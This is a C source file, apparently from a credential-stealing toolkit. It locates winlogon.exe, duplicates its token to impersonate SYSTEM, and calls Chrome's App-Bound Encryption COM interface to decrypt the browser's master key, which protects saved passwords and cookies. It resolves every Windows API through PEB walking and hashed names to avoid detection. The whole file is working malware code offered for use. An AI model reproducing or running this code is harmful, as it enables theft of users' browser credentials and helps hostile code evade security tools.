/*
 * elevator.c — SYSTEM impersonation for Chrome App-Bound key decryption.
 *
 * Ports Sentinel's Elevator.cs technique:
 *   1. FindWindowW("Shell_TrayWnd") → PID → find winlogon.exe
 *   2. OpenProcessToken → DuplicateTokenEx(SecurityImpersonation)
 *   3. ImpersonateLoggedOnUser → call COM IElevator
 *   4. RevertToSelf + cleanup
 *
 * All Win32 API calls resolved via PEB-walk (no IAT imports).
 */

#include "elevator.h"
#include "config.h"
#include "appbound.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"

#ifdef _WIN32
#ifdef ENABLE_ELEVATOR_IMPERSONATION

#include <windows.h>
#include <tlhelp32.h>

/* ── Function pointer types ───────────────────────────────────── */

typedef HWND   (WINAPI *pFindWindowW)(LPCWSTR, LPCWSTR);
typedef DWORD  (WINAPI *pGetWindowThreadProcessId)(HWND, LPDWORD);
typedef HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL   (WINAPI *pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL   (WINAPI *pDuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES,
                                            SECURITY_IMPERSONATION_LEVEL,
                                            TOKEN_TYPE, PHANDLE);
typedef BOOL   (WINAPI *pImpersonateLoggedOnUser)(HANDLE);
typedef BOOL   (WINAPI *pRevertToSelf)(void);
typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);

/* ── Resolve helper ───────────────────────────────────────────── */

static void* resolve_fn(void* mod, const char* name) {
    uint32_t h = mirage_encrypted_hash_func(name);
    return mirage_get_function_by_hash(mod, h);
}

/* ── Find winlogon.exe PID via Shell_TrayWnd ──────────────────── */

static DWORD find_winlogon_pid(void* user32, void* kernel32) {
    pFindWindowW fnFindWindow = (pFindWindowW)resolve_fn(user32, "FindWindowW");
    pGetWindowThreadProcessId fnGetPID = (pGetWindowThreadProcessId)resolve_fn(user32, "GetWindowThreadProcessId");

    if (!fnFindWindow || !fnGetPID) return 0;

    /* Get explorer.exe PID from Shell_TrayWnd */
    HWND hwnd = fnFindWindow(L"Shell_TrayWnd", NULL);
    if (!hwnd) return 0;

    DWORD explorer_pid = 0;
    fnGetPID(hwnd, &explorer_pid);
    if (explorer_pid == 0) return 0;

    /* Walk processes to find winlogon.exe — its session ID matches explorer's */
    typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
    typedef BOOL (WINAPI *pProcess32First)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL (WINAPI *pProcess32Next)(HANDLE, LPPROCESSENTRY32W);

    pCreateToolhelp32Snapshot fnSnapshot = (pCreateToolhelp32Snapshot)resolve_fn(kernel32, "CreateToolhelp32Snapshot");
    pProcess32First fnFirst = (pProcess32First)resolve_fn(kernel32, "Process32FirstW");
    pProcess32Next fnNext = (pProcess32Next)resolve_fn(kernel32, "Process32NextW");

    if (!fnSnapshot || !fnFirst || !fnNext) return 0;

    HANDLE snap = fnSnapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    DWORD winlogon_pid = 0;

    if (fnFirst(snap, &pe)) {
        do {
            /* Compare first 8 WCHARs of exe name = "winlogon" */
            if (pe.szExeFile[0] == 'w' || pe.szExeFile[0] == 'W') {
                if (_wcsnicmp(pe.szExeFile, L"winlogon", 8) == 0) {
                    winlogon_pid = pe.th32ProcessID;
                    break;
                }
            }
        } while (fnNext(snap, &pe));
    }

    typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
    pCloseHandle fnClose = (pCloseHandle)resolve_fn(kernel32, "CloseHandle");
    if (fnClose) fnClose(snap);

    return winlogon_pid;
}

/* ── elevate_and_decrypt_key ──────────────────────────────────── */

int elevate_and_decrypt_key(const unsigned char *enc_key, size_t enc_len,
                            AppBoundBrowser browser, unsigned char *key32) {
    /* Resolve modules */
    void* ntdll = mirage_get_module_by_hash(mirage_encrypted_hash_module("ntdll.dll"));
    void* kernel32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("kernel32.dll"));
    void* user32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("user32.dll"));
    void* advapi32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("advapi32.dll"));

    if (!ntdll || !kernel32 || !user32 || !advapi32)
        return -1;

    pOpenProcess fnOpenProcess = (pOpenProcess)resolve_fn(kernel32, "OpenProcess");
    pOpenProcessToken fnOpenToken = (pOpenProcessToken)resolve_fn(advapi32, "OpenProcessToken");
    pDuplicateTokenEx fnDupToken = (pDuplicateTokenEx)resolve_fn(advapi32, "DuplicateTokenEx");
    pImpersonateLoggedOnUser fnImpersonate = (pImpersonateLoggedOnUser)resolve_fn(advapi32, "ImpersonateLoggedOnUser");
    pRevertToSelf fnRevert = (pRevertToSelf)resolve_fn(advapi32, "RevertToSelf");
    pCloseHandle fnClose = (pCloseHandle)resolve_fn(kernel32, "CloseHandle");

    if (!fnOpenProcess || !fnOpenToken || !fnDupToken ||
        !fnImpersonate || !fnRevert || !fnClose)
        return -1;

    /* Find winlogon.exe PID */
    DWORD pid = find_winlogon_pid(user32, kernel32);
    if (pid == 0) return -1;

    /* Open winlogon process */
    HANDLE hProc = fnOpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc || hProc == INVALID_HANDLE_VALUE) return -1;

    /* Duplicate winlogon token for impersonation */
    HANDLE hToken = NULL;
    if (!fnOpenToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
        fnClose(hProc);
        return -1;
    }

    HANDLE hDupToken = NULL;
    BOOL ok = fnDupToken(hToken, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenImpersonation, &hDupToken);
    fnClose(hToken);
    fnClose(hProc);

    if (!ok || !hDupToken) return -1;

    /* Impersonate SYSTEM */
    if (!fnImpersonate(hDupToken)) {
        fnClose(hDupToken);
        return -1;
    }

    /* Call existing App-Bound COM decrypt while running as SYSTEM */
    int result = appbound_decrypt(enc_key, enc_len, browser, key32);

    /* Revert to original identity */
    fnRevert();
    fnClose(hDupToken);

    return result;
}

#endif /* ENABLE_ELEVATOR_IMPERSONATION */
#endif /* _WIN32 */
